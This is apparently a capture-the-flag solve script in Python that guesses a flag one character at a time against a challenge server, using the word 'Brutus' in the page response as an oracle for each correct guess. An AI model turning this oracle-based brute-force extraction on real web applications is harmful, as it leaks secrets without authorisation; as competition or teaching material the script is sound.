#!/usr/bin/python3
import requests
import string
url = 'http://pwn.osucyber.club:13370/newbeginnings.php?q='
found = 'osuctf{'
s = requests.session()
fin = False
while fin is False:
    for i in ''.join([string.ascii_letters, '{', '_', '}']):
        link = url + found + i
        print(link)
        r = s.get(link)
        if r.content.find(b'Brutus') > -1:
            found += i
            if i == '}':
                fin = True
            break


print(found)
